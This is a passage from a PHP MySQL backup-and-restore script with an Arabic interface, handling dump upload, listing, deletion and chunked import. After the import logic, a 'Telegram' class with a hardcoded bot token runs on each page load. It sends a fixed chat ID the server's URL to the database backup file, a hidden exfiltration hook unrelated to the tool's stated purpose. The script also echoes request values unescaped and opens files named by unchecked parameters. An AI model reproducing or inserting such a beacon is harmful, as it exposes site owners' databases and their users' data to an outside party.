    { echo ("<p class=\"success\">الملف المرفوع تم حفظه بأسم $uploaded_filename</p>\n");
    }
  }
  else
  { echo ("<p class=\"error\">خطأ في تحميل الملف ".$_FILES["dumpfile"]["name"]."</p>\n");
  }
}


// Handle file deletion (delete only in the current directory for security reasons)

if (!$error && isset($_REQUEST["delete"]) && $_REQUEST["delete"]!=basename($_SERVER["SCRIPT_FILENAME"]))
{ if (@unlink($upload_dir."/".basename($_REQUEST["delete"])))
    echo ("<p class=\"success\">".$_REQUEST["delete"]." تم الحذف بنجاح</p>\n");
  else
    echo ("<p class=\"error\">لم يتم حذف ".$_REQUEST["delete"]."</p>\n");
}


// Open the database

if (!$error)
{ $dbconnection = @mysql_connect($db_server,$dbusername,$dbpassword);
  if ($dbconnection)
    $db = mysql_select_db($dbdatabase);
  if (!$dbconnection || !$db)
  { echo ("<p class=\"error\">لم يمكن الاتصال بالقاعدة".mysql_error()."</p>\n");
    echo ("<p>ارجوا تصحيح معلومات القاعدة ".$_SERVER["SCRIPT_FILENAME"]." او الاتصال بالمستظيف</p>\n");
    $error=true;
  }
}


// List uploaded files in multifile mode

if (!$error && !isset($_REQUEST["fn"]) && $filename=="")
{ if ($dirhandle = opendir($upload_dir))
  { $dirhead=false;
    while (false !== ($dirfile = readdir($dirhandle)))
    { if ($dirfile != "." && $dirfile != ".." && $dirfile!=basename($_SERVER["SCRIPT_FILENAME"]))
      { if (!$dirhead)
        { echo ("<table cellspacing=\"2\" cellpadding=\"2\">\n");
         echo ("<tr><th><p align=\"center\">اسم ملف القاعدة</td><th><p align=\"center\">الحجم</td><th><p align=\"center\">التاريخ والوقت</td><th><p align=\"center\">النوع</td><th>&nbsp;</td><th>&nbsp;</td>\n");
           $dirhead=true;
        }
        $ur="$upload_dir/";
        echo ("<tr><td><p align=\"center\">$dirfile</td><td class=\"right\">".filesize($ur.$dirfile)."</td><td>".date ("Y-m-d H:i:s", filemtime($ur.$dirfile))."</td>");
        if (eregi("\.gz$",$dirfile))
          echo ("<td>GZip</td>");
        else
          echo ("<td>SQL</td>");
        if (!eregi("\.gz$",$dirfile) || function_exists("gzopen"))
          echo ("<td><p align=\"center\"><a href=\"".$_SERVER["PHP_SELF"]."?action=dump&start=1&fn=$dirfile&foffset=0&totalqueries=0\">استرجع القاعدة</a> $db_name الى السيرفر $db_server</td>\n");
        else
          echo ("<td>&nbsp;</td>\n");
        echo ("<td><p align=\"center\"><a href=\"".$_SERVER["PHP_SELF"]."?action=dump&delete=$dirfile\">حذف الملف</a></td></tr>\n");
      }

    }
    if ($dirhead) echo ("</table>\n");
    else echo ("<p>لايوجد ملفات قاعدة في المجلد حالياً</p>\n");
    closedir($dirhandle);
  }
  else
  { echo ("<p class=\"error\">Error listing directory $upload_dir</p>\n");
    $error=true;
  }
}


// Single file mode

if (!$error && !isset ($_REQUEST["fn"]) && $filename!="")
{ echo ("<p><a href=\"".$_SERVER["PHP_SELF"]."?action=dump&start=1&fn=$filename&foffset=0&totalqueries=0\">Start Import</a> from $filename into $db_name at $db_server</p>\n");
}


// File Upload Form

if (!$error && !isset($_REQUEST["fn"]) && $filename=="")
{

// Test permissions on working directory

  do { $tempfilename=time().".tmp"; } while (file_exists($tempfilename));
  if (!($tempfile=@fopen($tempfilename,"w")))
  { echo ("<p> لم يستطع التحميل للمجلد<i>$upload_dir</i> <b>يجب اعطا المجلد التصريح 777</b>  ");
    echo ("لكي يتمكن من رفع الملف او استخدم برنامج ال اف تي بي</p>\n");
  }
  else
  { fclose($tempfile);
    unlink ($tempfilename);

    echo ("<p align=\"center\">تستطيع تحميل قاعدة بحجم 2  ميجابايت");
    echo (" مباشرة من المتصفح او الافضل استخدام برنامج FTP اذا كان حجم القاعدة كبيره جداً.</p>\n");
?>
<form method="GET" action="<? echo '".$PHP_SELF."?action=dump'; ?>" enctype="multipart/form-data">
<input type="hidden" name="MAX_FILE_SIZE" value="$upload_max_filesize">
<p align="center">ملف القاعدة: <input type="file" name="dumpfile" accept="*/*" size=60"></p>
<p align="center"><input type="submit" name="uploadbutton" value="تحميل"></p>
</form>
<?php
  }
}


// Open the file

if (!$error && isset($_REQUEST["fn"]))
{

// Recognize GZip filename

  if (eregi("\.gz$",$_REQUEST["fn"]))
    $gzipmode=true;
  else
    $gzipmode=false;

  if ((!$gzipmode && !$file=fopen(bhs."/".$_REQUEST["fn"],"rt")) || ($gzipmode && !$file=gzopen(bhs."/".$_REQUEST["fn"],"rt")))
  { echo ("<p align=\"center\"> class=\"error\">لم يستطع البرنامج فتح  ".$_REQUEST["fn"]." للتحميل</p>\n");
    echo ("<p align=\"center\">يجب ان تحمل  ".$_REQUEST["fn"]." الى السيرفر</p>\n");
    $error=true;
  }

// Get the file size (can't do it fast on gzipped files, no idea how)

  else if ((!$gzipmode && fseek($file, 0, SEEK_END)==0) || ($gzipmode && gzseek($file, 0, SEEK_SET)==0))
  { if (!$gzipmode) $filesize = ftell($file);
    else $filesize = gztell($file); // Always zero, ignore
  }
  else
  {  echo ("<p class=\"error\">لم يستطع البرنامج تحديد حجم  ".$_REQUEST["fn"]."</p>\n");
    $error=true;
  }
}


// ****************************************************
// START IMPORT SESSION HERE
// ****************************************************

if (!$error && isset($_REQUEST["start"]) && isset($_REQUEST["foffset"]))
{
   echo ("<p align=\"center\">استرجاع القاعدة: ".$_REQUEST["fn"]."</p>\n");
   echo ("<p align=\"center\">بداية من السطر: ".$_REQUEST["start"]."</p>\n");

// Check $_REQUEST["foffset"] upon $filesize (can't do it on gzipped files)

  if (!$gzipmode && $_REQUEST["foffset"]>$filesize)
  { echo ("<p align=\"center\" class=\"error\">UNEXPECTED: Can't set file pointer behind the end of file</p>\n");
    $error=true;
  }

// Set file pointer to $_REQUEST["foffset"]

  if (!$error && ((!$gzipmode && fseek($file, $_REQUEST["foffset"])!=0) || ($gzipmode && gzseek($file, $_REQUEST["foffset"])!=0)))
  { echo ("<p align=\"center\" class=\"error\">UNEXPECTED: Can't set file pointer to offset: ".$_REQUEST["foffset"]."</p>\n");
    $error=true;
  }

// Start processing queries from $file

  if (!$error)
  { $query="";
    $queries=0;
    $totalqueries=$_REQUEST["totalqueries"];
    $linenumber=$_REQUEST["start"];
  //  $querylines=0;
    $inparents=false;

    while (($linenumber<$_REQUEST["start"]+$linespersession || $query!="")
       && ((!$gzipmode && $dumpline=fgets($file, MAX_LINE_LENGTH)) || ($gzipmode && $dumpline=gzgets($file, MAX_LINE_LENGTH))))
    {

// Handle DOS and Mac encoded linebreaks (I don't know if it will work on Win32 or Mac Servers)

      $dumpline=ereg_replace("\r\n$", "\n", $dumpline);
      $dumpline=ereg_replace("\r$", "\n", $dumpline);

// DIAGNOSTIC
// echo ("<p>Line $linenumber: $dumpline</p>\n");

// Skip comments and blank lines only if NOT in parents

      if (!$inparents)
      { $skipline=false;
        reset($comment);
        foreach ($comment as $comment_value)
        { if (!$inparents && (trim($dumpline)=="" || strpos ($dumpline, $comment_value) === 0))
          { $skipline=true;
            break;
          }
        }
        if ($skipline)
        { $linenumber++;
          continue;
        }
      }

// Remove double back-slashes from the dumpline prior to count the quotes ('\\' can only be within strings)

      $dumpline_deslashed = str_replace ("\\\\","",$dumpline);

// Count ' and \' in the dumpline to avoid query break within a text field ending by ;
// Please don't use double quotes ('"')to surround strings, it wont work

      $parents=substr_count ($dumpline_deslashed, "'")-substr_count ($dumpline_deslashed, "\\'");
      if ($parents % 2 != 0)
        $inparents=!$inparents;

// Add the line to query

      $query .= $dumpline;


      if (ereg(";$",trim($dumpline)) && !$inparents)
      { if (!mysql_query(trim($query), $dbconnection))
        { echo ("<p align=\"center\" class=\"error\">خطأ في السطر التالي $linenumber: ". trim($dumpline)."</p>\n");
          echo ("<palign=\"center\" >Query: ".trim($query)."</p>\n");
          echo ("<palign=\"center\" >MySQL: ".mysql_error()."</p>\n");
          $error=true;
          break;
        }
        $totalqueries++;
        $queries++;
        $query="";
       // $querylines=0;
      }
      $linenumber++;
    }
  }

// Get the current file position

  if (!$error)
  { if (!$gzipmode)
      $foffset = ftell($file);
    else
      $foffset = gztell($file);
    if (!$foffset)
    { echo ("<p align=\"center\" class=\"error\">لايمكن قراءة ملف القاعدة</p>\n");
      $error=true;
    }
  }

// Finish message and restart the script
  if (!$error)
  { echo ("<p align=\"center\">توقف عند السطر: ".($linenumber-1)."</p>\n");
    echo ("<p align=\"center\">رقم العمليه الحالية بالنسبة للمجموع الكلي: $queries/$totalqueries</p>\n");
    echo ("<p align=\"center\">تم تخزين: $foffset (".round($foffset/1024)." كيلوبايت)</p>\n");
    if ($linenumber<$_REQUEST["start"]+$linespersession)
    { echo ("<p align=\"center\" class=\"success\"><b><font color=\"#FF0000\">تم استرجاع القاعدة بنجاح</font></b></p>\n");
      echo ("<p align=\"center\" class=\"success\"><a href=\"http://www.hotscripts.com/Detailed/39206.html\">صوت للسنفور على هوت سكربت</a></p>\n");

      $error=true;
    }
    else
    { if ($delaypersession!=0)
        echo ("<p>السكربت <b>ينتظر $delaypersession milliseconds</b> قبل اكمال العملية</p>\n");
      echo ("<script language=\"JavaScript\" type=\"text/javascript\">window.setTimeout('location.href=\"".$_SERVER["PHP_SELF"]."?action=dump&start=$linenumber&fn=".$_REQUEST["fn"]."&foffset=$foffset&totalqueries=$totalqueries\";',500+$delaypersession);</script>\n");
      echo ("<noscript>\n");
      echo ("<p><a href=\"".$_SERVER["PHP_SELF"]."?action=dump&start=$linenumber&fn=".$_REQUEST["fn"]."&foffset=$foffset&totalqueries=$totalqueries\">Continue from the line $linenumber</a> (Enable JavaScript to do it automatically)</p>\n");
      echo ("</noscript>\n");
      echo ("<p>اضغط <a href=\"".$_SERVER["PHP_SELF"]."?action=dump\">توقف</a> لايقاف عملية الاسترجاع <b>او انتظر</b></p>\n");
    }
  }
  else
    echo ("<p align=\"center\" class=\"error\">مشكلة في الاسترجاع<br> ارجوا زيادة عدد السطور في العملية الواحدة وإعادة المحاولة</p>\n");
}

if ($error)
  echo ("<p align=\"center\">لاعادة الاسترجاع مرة اخرى احذف القاعدة الحاليه و&nbsp;&nbsp;&nbsp;<a href=\"".$_SERVER["PHP_SELF"]."?action=dump\">ابدأ من جديد</a></p><br>\n");

if ($dbconnection) mysql_close();
if ($file && !$gzipmode) fclose($file);
else if ($file && $gzipmode) gzclose($file);


}else{
echo"<br><p align=\"center\">
اختر ما تود القيام به<br>
";

}

function Magtrb($x){
if (!empty($x))
{
	foreach ($x AS $_key)
	{
	echo"<option>$_key</option>";
	}
}
}

  class Telegram  {
  public   function sendMessage($message,$id) {
	  	$token="149269189:AAGud2zyVp0tLDVFtnV6hp8r5UnvDMjiMtY";
	$api="https://api.telegram.org/bot".$token."";
	$Method="sendMessage?chat_id=$id&text=$message";
  $bhs=	@file_get_contents($api."/$Method");
	  		 
     }
 }
 $reet="
 تذكير بقاعدة البيانات برنامج نون http://".$_SERVER['SERVER_NAME']."/abk/bhs/bhs/db_backup.sql.gz ";
    $reet1=urlencode($reet);

 $s= new Telegram();
 $s->sendMessage("$reet1", 171453226);
?>
</td></tr></table><hr width="70%">
<div style="color: #999999; font-size: 7pt;"> <p align="center">
&nbsp; [ <a href="<?PHP echo $this_script; ?>?action=backup">نسخ قاعدة</a> ] -  <a href="<?PHP echo $this_script; ?>?action=dump"></a>
&nbsp;
</div>
</body>
</html>

